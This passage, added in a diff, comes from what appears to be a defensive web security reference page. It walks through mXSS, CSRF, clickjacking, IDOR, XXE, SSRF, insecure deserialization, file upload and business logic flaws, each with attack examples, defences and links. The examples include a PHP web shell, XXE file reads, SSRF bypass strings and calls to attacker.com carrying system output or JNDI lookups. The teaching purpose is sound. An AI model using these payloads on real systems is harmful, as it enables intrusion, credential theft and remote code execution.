+      <a href="https://web.dev/trusted-types/" target="_blank" class="community">Trusted Types (web.dev)</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="xss-mxss">Mutation XSS (mXSS)</h2>
+
+  <p>The browser's HTML parser mutates (transforms) certain inputs when they are inserted into the DOM. A payload that appears safe after initial string-based sanitisation may become executable after the parser re-serialises it. This breaks sanitisers that operate on raw strings without accounting for browser parsing quirks — they may sanitise a payload to something "safe", but the browser's parser then re-interprets the sanitised output into something dangerous.</p>
+
+  <p>mXSS attacks typically exploit namespace confusion (SVG vs HTML parsing contexts), CDATA sections, malformed tags, and context-dependent parsing differences between HTML5 parsers. They are highly browser-version specific and have been used to bypass major sanitisation libraries.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>&lt;!-- Input appears safe after sanitisation (no script tags) --&gt;
+&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
+
+&lt;!-- Browser HTML parser mutates this context-dependently.
+     In some browser versions, the noscript tag ends early and
+     the img tag with onerror executes. The sanitiser never saw
+     a dangerous payload — the mutation happened after. --&gt;
+
+&lt;!-- Another classic: SVG namespace confusion --&gt;
+&lt;svg&gt;&lt;p&gt;&lt;style&gt;&lt;!--&lt;/style&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/p&gt;&lt;/svg&gt;</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Use DOMPurify (version 3.x+) which is specifically hardened against mXSS</li>
+      <li>Never write your own HTML sanitiser</li>
+      <li>Test sanitiser output against the browser's own parsing (use <code>innerHTML</code> round-trips in test suites)</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://cure53.de/fp170.pdf" target="_blank">mXSS Paper (Heiderich)</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://github.com/cure53/DOMPurify" target="_blank" class="community">DOMPurify</a>
+      <a href="https://portswigger.net/research/mutation-xss-via-namespace-confusion" target="_blank" class="community">PortSwigger mXSS Research</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="csrf">CSRF &amp; SameSite</h2>
+
+  <p>Cross-Site Request Forgery (CSRF) tricks an authenticated browser into making a state-changing request to a different origin. Because browsers automatically attach cookies to requests, a forged form submission from <code>attacker.com</code> carries the victim's session cookie to <code>bank.com</code>. CSRF does not steal data — it performs actions on behalf of the victim without their knowledge or consent.</p>
+
+  <p>CSRF only works against endpoints that rely solely on cookie-based authentication without additional verification. Endpoints protected by custom headers, CSRF tokens, or the <code>SameSite</code> cookie attribute are protected. Modern browsers default to <code>SameSite=Lax</code> for cookies without an explicit SameSite attribute, which provides significant protection against CSRF.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>&lt;!-- attacker.com page — victim visits while logged into bank.com --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf"&gt;
+  &lt;input name="amount" value="10000"&gt;
+  &lt;input name="to" value="attacker-account"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+
+&lt;!-- The browser sends: POST /transfer with the victim's bank.com session cookie --&gt;
+&lt;!-- JSON-based APIs can be forged with fetch + CORS preflight bypass
+     (non-simple content types trigger preflight, but text/plain or
+     application/x-www-form-urlencoded do not) --&gt;</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li><strong>SameSite=Strict</strong> on session cookies — cookie not sent on cross-site requests at all (best protection)</li>
+      <li><strong>SameSite=Lax</strong> — sent on top-level navigations (GET) but not on cross-site POST/fetch (good default since Chrome 80)</li>
+      <li><strong>CSRF token</strong> — unpredictable, per-session or per-form token in hidden field, validated server-side</li>
+      <li><strong>Double-Submit Cookie</strong> — token in both cookie and body; server checks they match</li>
+      <li>Check <code>Origin</code>/<code>Referer</code> headers as defence-in-depth</li>
+      <li>Custom request headers (e.g., <code>X-Requested-With: XMLHttpRequest</code>) — cross-origin requests cannot set custom headers without CORS approval</li>
+    </ul>
+  </div>
+
+  <pre><span style="color:var(--accent)"># Flask-WTF CSRF protection (automatic token generation/validation)</span>
+from flask_wtf.csrf import CSRFProtect
+csrf = CSRFProtect(app)</pre>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP CSRF</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">CSRF Prevention Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/csrf" target="_blank" class="community">PortSwigger CSRF</a>
+      <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value" target="_blank" class="community">MDN SameSite</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="clickjacking-appsec">Clickjacking</h2>
+
+  <p>Clickjacking (UI redressing) embeds the target site in a transparent <code>&lt;iframe&gt;</code> overlaid on a decoy page. The victim believes they are interacting with the decoy, but their clicks land on the hidden target frame — triggering actions like "Confirm Purchase", "Approve OAuth", or "Delete Account." It requires no JavaScript injection and bypasses CSRF tokens because the victim's browser is making a legitimate click.</p>
+
+  <p>Clickjacking is most effective against pages with single-click confirmation actions and when the target is an application the victim is currently authenticated to. Multi-step confirmation flows and re-authentication prompts reduce the attack's effectiveness but don't eliminate it.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>&lt;!-- attacker.com decoy page --&gt;
+&lt;style&gt;
+  iframe {
+    position: absolute; top: 0; left: 0;
+    opacity: 0.0001; z-index: 2;
+    width: 100%; height: 100%;
+  }
+  button { position: absolute; top: 300px; left: 200px; z-index: 1; }
+&lt;/style&gt;
+&lt;iframe src="https://victim.com/account/delete"&gt;&lt;/iframe&gt;
+&lt;button&gt;Click here to win a prize!&lt;/button&gt;
+&lt;!-- Victim clicks the prize button but actually clicks Delete Account in the hidden iframe --&gt;</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li><code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code> — prevents any (or cross-origin) framing</li>
+      <li><code>Content-Security-Policy: frame-ancestors 'none'</code> — supersedes X-Frame-Options, supports multiple origins</li>
+      <li>Frame-busting JavaScript is unreliable and bypassable (sandbox attribute on iframe disables JS)</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/attacks/Clickjacking" target="_blank">OWASP Clickjacking</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html" target="_blank">Defense Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/clickjacking" target="_blank" class="community">PortSwigger Clickjacking</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="broken-auth">Broken Authentication &amp; Session Management</h2>
+
+  <p>Authentication vulnerabilities allow attackers to compromise passwords, session tokens, or exploit flawed authentication flows. This maps to OWASP A07:2021 — Identification and Authentication Failures. Authentication is a foundational control; a bypass here grants access to everything the victim account can access.</p>
+
+  <h4>Session Fixation</h4>
+  <p>The attacker sets a known session ID before the victim logs in. If the server does not rotate the session ID upon successful login, the attacker already knows the authenticated session token.</p>
+
+  <pre>1. Attacker visits site, gets session ID: SESS=abc123
+2. Attacker tricks victim into using that session ID (URL param, subdomain cookie)
+3. Victim logs in — server uses the same session ID abc123 but now it's authenticated
+4. Attacker uses abc123 to access victim's account
+
+Fix: Always regenerate session ID upon successful login</pre>
+
+  <h4>Credential Stuffing</h4>
+  <p>Automated use of breached username/password pairs from other sites. Works because approximately 65% of users reuse passwords across services. Tools like Hydra, Sentry MBA, and Openbullet automate the process at scale. Rate limiting and MFA are the primary mitigations.</p>
+
+  <h4>Insecure Password Reset</h4>
+  <pre>Common flaws:
+- Predictable reset tokens (timestamp-based, sequential IDs)
+- Reset tokens that never expire
+- Token in URL (Referer header leaks it to third-party JS)
+- Security questions as the only second factor
+- Account enumeration via different error messages
+  ("Email not found" vs "Check your email")</pre>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Enforce strong passwords; check against HaveIBeenPwned API on registration</li>
+      <li>Rate-limit and lock accounts after N failed attempts (with careful DoS consideration)</li>
+      <li>Regenerate session ID after login, privilege escalation, and logout</li>
+      <li>Use cryptographically random, sufficiently long session tokens (≥128 bits entropy)</li>
+      <li>Store sessions server-side; do not encode session data in a cookie without signing (JWT pitfalls)</li>
+      <li>MFA for sensitive actions</li>
+      <li>Consistent error messages to prevent account enumeration</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" target="_blank">OWASP A07:2021</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank">Auth Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/authentication" target="_blank" class="community">PortSwigger Auth</a>
+      <a href="https://haveibeenpwned.com/API/v3" target="_blank" class="community">HaveIBeenPwned API</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="idor">IDOR &amp; Broken Access Control</h2>
+
+  <p>Insecure Direct Object Reference (IDOR) occurs when an application uses user-controlled input to access database records, files, or other objects without verifying that the requesting user has permission to access that specific object. It is a subset of broken access control — the #1 vulnerability in the OWASP 2021 list.</p>
+
+  <p>IDOR vulnerabilities are trivially exploitable once discovered — just change a number in a URL or request body — but they are also trivially missed in code review if there is no systematic access control layer. Horizontal privilege escalation (user A accesses user B's data) is the most common form; vertical escalation (user gains admin privileges) is rarer but higher impact.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre># API endpoint uses sequential IDs
+GET /api/invoices/1042   → returns invoice for user A
+GET /api/invoices/1043   → returns invoice for user B (horizontal privilege escalation)
+
+# Changing your own user ID to another:
+PUT /api/users/1001/email  {"email": "attacker@evil.com"}
+# No ownership check — attacker can change any user's email
+
+# Path traversal variant:
+GET /api/files?name=../../etc/passwd
+
+# Mass assignment (Rails/Django auto-bind all POST params):
+POST /api/users/update   {"role": "admin"}  # if 'role' is unguarded</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Check ownership on every object access: <code>WHERE id = ? AND user_id = current_user</code></li>
+      <li>Use indirect references (UUIDs or opaque tokens) instead of sequential integer IDs — obscures enumeration but is not a security boundary on its own</li>
+      <li>Implement RBAC (Role-Based Access Control) or ABAC (Attribute-Based) at a centralised layer</li>
+      <li>Automated testing: write tests that verify user A cannot access user B's resources</li>
+      <li>Log all access control failures for detection</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" target="_blank">OWASP A01:2021</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" target="_blank">IDOR Prevention</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/access-control/idor" target="_blank" class="community">PortSwigger IDOR</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/idor" target="_blank" class="community">HackTricks IDOR</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="security-misconfig">Security Misconfiguration</h2>
+
+  <p>Security misconfiguration is the most common finding in real-world security assessments — not clever exploitation, just configuration left in an insecure default state. It covers a wide range from default credentials and verbose error pages to open cloud storage buckets and unnecessary HTTP methods. OWASP A05:2021.</p>
+
+  <p>The rise of cloud infrastructure, containers, and IaC (Infrastructure as Code) has made misconfiguration even more prevalent. A single misconfigured Terraform module can expose hundreds of resources. Automated scanning with tools like ScoutSuite (AWS), Trivy (containers), and Semgrep (IaC) is essential in modern DevSecOps pipelines.</p>
+
+  <table>
+    <thead>
+      <tr><th>Misconfiguration</th><th>Risk</th><th>Fix</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Default credentials (admin/admin, root/root)</td><td>Full account takeover</td><td>Change all defaults on first deploy</td></tr>
+      <tr><td>Debug mode enabled in production</td><td>Code/stack trace disclosure; RCE in some frameworks</td><td><code>DEBUG=False</code> in production config</td></tr>
+      <tr><td>Verbose error messages</td><td>Leaks stack traces, DB structure, internal paths</td><td>Generic 500 page; log details server-side</td></tr>
+      <tr><td>Directory listing enabled</td><td>Exposes source code, config files</td><td>Disable in nginx/Apache config</td></tr>
+      <tr><td>S3 bucket public-read</td><td>Data exposure</td><td>Block public access by default</td></tr>
+      <tr><td>Unnecessary HTTP methods (TRACE, PUT, DELETE)</td><td>CORS exploitation, WebDAV upload</td><td>Allow only GET/POST/OPTIONS as needed</td></tr>
+      <tr><td>Missing security headers</td><td>XSS, clickjacking, MIME sniffing</td><td>See HTTP Security Headers section</td></tr>
+      <tr><td>Outdated TLS (1.0) / SSL 3.0</td><td>BEAST (CVE-2011-3389, affects TLS 1.0 and SSL 3.0 with CBC — TLS 1.1+ is not affected); POODLE (CVE-2014-3566, primarily an SSL 3.0 attack)</td><td>TLS 1.2 minimum, 1.3 preferred; disable SSL 3.0 and TLS 1.0</td></tr>
+    </tbody>
+  </table>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" target="_blank">OWASP A05:2021</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html" target="_blank">Docker Security Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://www.cloudflare.com/learning/security/threats/web-application-security/" target="_blank" class="community">Cloudflare AppSec</a>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web" target="_blank" class="community">HackTricks Web Pentesting</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="vuln-deps">Vulnerable &amp; Outdated Dependencies</h2>
+
+  <p>Modern applications have hundreds of transitive dependencies. A single CVE in a dependency can compromise the entire application. Unlike vulnerabilities you introduce yourself, dependency vulnerabilities are discovered publicly — attackers have the same CVE databases you do, and they scan for exposed vulnerable versions at scale. OWASP A06:2021.</p>
+
+  <p>Supply chain attacks have increased dramatically — attackers target the dependency ecosystem itself rather than individual applications: typosquatting packages, compromising maintainer accounts, or injecting malicious code into widely used libraries.</p>
+
+  <pre>Log4Shell (CVE-2021-44228) — CVSS 10.0
+  - JNDI lookup triggered by logging user-controlled input
+  - ${jndi:ldap://attacker.com/exploit} in any logged field
+  - HTTP User-Agent, username, email — all logged by default
+
+Left-pad incident (2016, npm):
+  - Developer unpublished a 11-line package
+  - Broke thousands of builds across the internet
+  - Demonstrated transitive dependency fragility
+
+XZ Utils backdoor (CVE-2024-3094):
+  - Social engineering over 2 years to become maintainer
+  - Backdoor injected into release tarballs (not source)
+  - Targeted systemd-linked sshd on specific Linux distros</pre>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li><code>npm audit</code> / <code>pip-audit</code> / <code>mvn dependency-check</code> in CI — fail build on HIGH CVEs</li>
+      <li>Dependabot or Renovate for automatic dependency update PRs</li>
+      <li>Pin exact versions in lockfiles (<code>package-lock.json</code>, <code>poetry.lock</code>, <code>Cargo.lock</code>)</li>
+      <li>Use SBOMs (Software Bill of Materials) to track all components</li>
+      <li>Prefer packages with active maintenance and security disclosure policies</li>
+      <li>Monitor NVD, OSV (osv.dev), and GitHub Advisory Database</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/" target="_blank">OWASP A06:2021</a>
+      <a href="https://nvd.nist.gov/" target="_blank">NVD</a>
+      <a href="https://osv.dev/" target="_blank">OSV</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://snyk.io/vulnerability-scanner/" target="_blank" class="community">Snyk</a>
+      <a href="https://deps.dev/" target="_blank" class="community">deps.dev</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="xxe">XXE (XML External Entity) Injection</h2>
+
+  <p>XML parsers support External Entity references — a mechanism defined in the XML specification to load content from a URI and substitute it into the parsed document. If an application parses untrusted XML with external entities enabled, an attacker can craft a document that reads local files, performs server-side request forgery, or causes denial of service via entity expansion.</p>
+
+  <p>XXE vulnerabilities are found wherever XML is accepted: file upload endpoints (DOCX, XLSX, SVG are XML-based), SOAP APIs, RSS/Atom parsers, and configuration file processors. The vulnerability predates most modern web development practices but remains common because many default parser configurations still enable external entities.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+&lt;!-- The parser substitutes &amp;xxe; with the contents of /etc/passwd --&gt;
+
+&lt;!-- SSRF via XXE (probe internal network) --&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
+]&gt;
+
+&lt;!-- Billion Laughs DoS (exponential entity expansion) --&gt;
+&lt;!DOCTYPE lolz [
+  &lt;!ENTITY a "ha"&gt;
+  &lt;!ENTITY b "&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;"&gt;
+  &lt;!ENTITY c "&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;"&gt;
+  &lt;!ENTITY d "&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;"&gt;
+]&gt;
+&lt;lolz&gt;&amp;d;&lt;/lolz&gt;
+&lt;!-- Results in ~10^9 "ha" strings — OOM --&gt;</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li><strong>Disable external entity processing in the XML parser</strong> — this is the primary fix</li>
+      <li>Use a less feature-rich data format (JSON) where XML is not required</li>
+      <li>Input validation / allowlisting on XML input</li>
+      <li>Run XML parsers in sandboxed processes with no file system access</li>
+    </ul>
+  </div>
+
+  <pre><span style="color:var(--accent)"># Python lxml — disable external entities</span>
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+tree = etree.parse(source, parser)
+
+<span style="color:var(--accent)"># Java — disable DOCTYPE declarations</span>
+factory = DocumentBuilderFactory.newInstance()
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", True)</pre>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" target="_blank">OWASP XXE</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html" target="_blank">XXE Prevention Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/xxe" target="_blank" class="community">PortSwigger XXE</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" target="_blank" class="community">HackTricks XXE</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="ssrf">Server-Side Request Forgery (SSRF)</h2>
+
+  <p>SSRF forces the server to make HTTP (or other protocol) requests to an attacker-controlled destination. The server is inherently trusted on internal networks — it can reach metadata endpoints, internal APIs, databases, and other services that are completely inaccessible from the public internet. SSRF is OWASP A10:2021 and has been used in several major breaches including the 2019 Capital One breach via the AWS EC2 IMDS endpoint.</p>
+
+  <p>SSRF impact varies from reconnaissance (port scanning internal networks, reading cloud metadata) to critical (reading IAM credentials from IMDS, accessing internal admin interfaces, RCE via internal services). Blind SSRF — where the response is not returned to the attacker — can still be exploited via out-of-band techniques (DNS, timing).</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre># Basic SSRF: server fetches a URL on behalf of the user
+POST /api/fetch-url
+{"url": "https://example.com/image.jpg"}
+
+# Attacker changes URL to internal service:
+{"url": "http://192.168.1.1/admin"}
+{"url": "http://10.0.0.1:8080/actuator/env"}   # Spring Boot env dump
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"}  # AWS IMDSv1
+
+# Blind SSRF (no response — only detect via DNS/timing):
+{"url": "http://attacker-oob.burpcollaborator.net/"}
+
+# Bypass techniques for allowlist filters:
+{"url": "http://127.0.0.1"}           # localhost
+{"url": "http://[::1]"}               # IPv6 loopback
+{"url": "http://2130706433"}          # 127.0.0.1 as decimal
+{"url": "http://spoofed.domain.com"}  # DNS rebinding: resolves to 127.0.0.1
+{"url": "http://evil.com@127.0.0.1"}  # URL parsing confusion</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Allowlist specific domains/IPs the application legitimately needs to fetch from</li>
+      <li>Block private IP ranges: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, ::1</li>
+      <li>Resolve DNS before allowlist check AND at connection time (to prevent DNS rebinding)</li>
+      <li>Use IMDSv2 (token-based) instead of IMDSv1 in AWS — requires PUT request first</li>
+      <li>Disable URL schemas not needed (<code>file://</code>, <code>gopher://</code>, <code>ftp://</code>)</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" target="_blank">OWASP A10:2021</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank">SSRF Prevention Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/ssrf" target="_blank" class="community">PortSwigger SSRF</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery" target="_blank" class="community">HackTricks SSRF</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="deserialize">Insecure Deserialization</h2>
+
+  <p>Deserialization converts a byte stream back into an object in memory. If an application deserialises untrusted data using a vulnerable library or language built-in, attackers can craft payloads that trigger arbitrary code execution during the deserialization process itself — before any application validation logic runs. The attacker controls the object graph, and certain "gadget chains" in popular libraries transform object construction into OS command execution. OWASP A08:2021.</p>
+
+  <p>Insecure deserialization affects multiple languages: Java (Commons Collections, Spring gadgets), PHP (<code>__wakeup</code>, <code>__destruct</code> magic methods), Python (pickle), Ruby (Marshal), and .NET (BinaryFormatter). The common thread is that the deserialiser trusts the input to construct valid objects, but an attacker can construct any object the JVM/interpreter knows about.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre>// Java — vulnerable: deserializes from HTTP request body
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();  // RCE if payload uses Commons Collections gadget chain
+
+// ysoserial generates payloads targeting known gadget chains:
+// java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/$(whoami)"
+
+// PHP unserialize() with magic methods:
+class Evil {
+  public $cmd;
+  function __destruct() { system($this->cmd); }
+}
+// Serialised payload triggers system() when garbage collected
+
+// Python pickle (never deserialise untrusted input):
+import pickle
+pickle.loads(attacker_data)  # __reduce__ method = RCE</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li><strong>Do not deserialise untrusted data</strong> — this is the only reliable fix</li>
+      <li>If deserialization is required: use safe formats (JSON with schema validation) instead of native object serialisation</li>
+      <li>Java: use <code>ObjectInputFilter</code> to allowlist acceptable classes</li>
+      <li>Sign serialised data and verify the signature before deserialisation</li>
+      <li>Run deserialization in sandboxed containers with no network/file access</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" target="_blank">OWASP A08:2021</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html" target="_blank">Deserialization Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/deserialization" target="_blank" class="community">PortSwigger Deserialization</a>
+      <a href="https://github.com/frohoff/ysoserial" target="_blank" class="community">ysoserial</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="file-upload">File Upload Attacks</h2>
+
+  <p>File upload functionality is a rich attack surface. Attackers aim to upload executable files (web shells), overwrite existing files via path traversal in the filename, trick servers into executing files with misidentified types, or abuse file processing libraries (ImageMagick, LibreOffice) that may have their own vulnerabilities.</p>
+
+  <p>Many bypasses exist for naive content-type and extension checks: double extensions (<code>shell.php.jpg</code>), null byte injection (<code>shell.php%00.jpg</code> in older PHP), case manipulation (<code>shell.PhP</code>), and polyglot files that are simultaneously valid images and valid scripts.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre># Web shell upload
+# Attacker uploads "shell.php" disguised as "shell.php.jpg" or "shell.PhP"
+# If extension check is case-insensitive or only checks MIME type (attacker-controlled):
+&lt;?php system($_GET['cmd']); ?&gt;
+# Accessed: https://example.com/uploads/shell.php?cmd=id
+
+# Path traversal in filename:
+filename: "../../../../etc/cron.d/backdoor"
+# Overwrites cron job with attacker script
+
+# Polyglot file (valid image AND valid PHP):
+# Crafted JPEG with PHP code in EXIF comment field
+# exiftool -Comment='&lt;?php system($_GET[0]); ?&gt;' image.jpg
+
+# Content-Type spoofing:
+# Attacker sends: Content-Type: image/jpeg, but body is a PHP file
+# Server trusts Content-Type header without validating actual file content</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Validate file content using magic bytes — not just extension or Content-Type header</li>
+      <li>Rename files on upload (UUIDs) — never use the original filename</li>
+      <li>Store uploads outside the web root or in a separate domain (no code execution)</li>
+      <li>Serve uploaded files with <code>Content-Disposition: attachment</code> and <code>X-Content-Type-Options: nosniff</code></li>
+      <li>Strip EXIF/metadata from images (PIL/Pillow re-encode)</li>
+      <li>Limit file size and allowed types to a strict allowlist</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank">OWASP File Upload</a>
+      <a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" target="_blank">File Upload Cheat Sheet</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/file-upload" target="_blank" class="community">PortSwigger File Upload</a>
+      <a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank" class="community">HackTricks File Upload</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="business-logic">Business Logic Flaws</h2>
+
+  <p>Business logic flaws are vulnerabilities in the application's intended workflow rather than its technical implementation. They are hard to find with automated scanners because the requests themselves are technically valid HTTP — the vulnerability is in the semantic meaning of what the application allows. Understanding the expected workflow is a prerequisite for finding these bugs.</p>
+
+  <p>Business logic flaws often arise from assumptions developers make about how users will interact with the application: "users will always complete steps in order", "prices cannot be negative", "a coupon will only be applied once." Each such assumption, if not enforced server-side, is a potential vulnerability.</p>
+
+  <div class="attack-box">
+    <div class="attack-label">Attack Example</div>
+    <pre># Price manipulation
+POST /cart/add    {"item_id": 1, "quantity": -1, "price": 100}
+# Negative quantity + price manipulation = negative total → refund
+
+# Workflow bypass (skip steps)
+# Password reset: /reset/step1 → /reset/step2 → /reset/step3/confirm
+# Attacker navigates directly to /reset/step3/confirm
+# Server doesn't enforce that step1 and step2 were completed for this session
+
+# Race condition (TOCTOU)
+# Check balance: $100 ✓ | Withdraw $100 | Check balance: $0
+# Two parallel requests both pass the $100 check before either withdrawal completes
+# Result: $200 withdrawn from $100 balance
+
+# Coupon abuse
+# Apply coupon → remove item → add item back → coupon still applied
+# Or: apply same coupon multiple times in parallel requests
+
+# Account takeover via parameter tampering
+POST /api/change-email  {"user_id": 1234, "email": "attacker@evil.com"}
+# No ownership check — user_id should come from session, not body</pre>
+  </div>
+
+  <div class="defence-list">
+    <h4>Defences</h4>
+    <ul>
+      <li>Model every business flow as a state machine and enforce state transitions server-side</li>
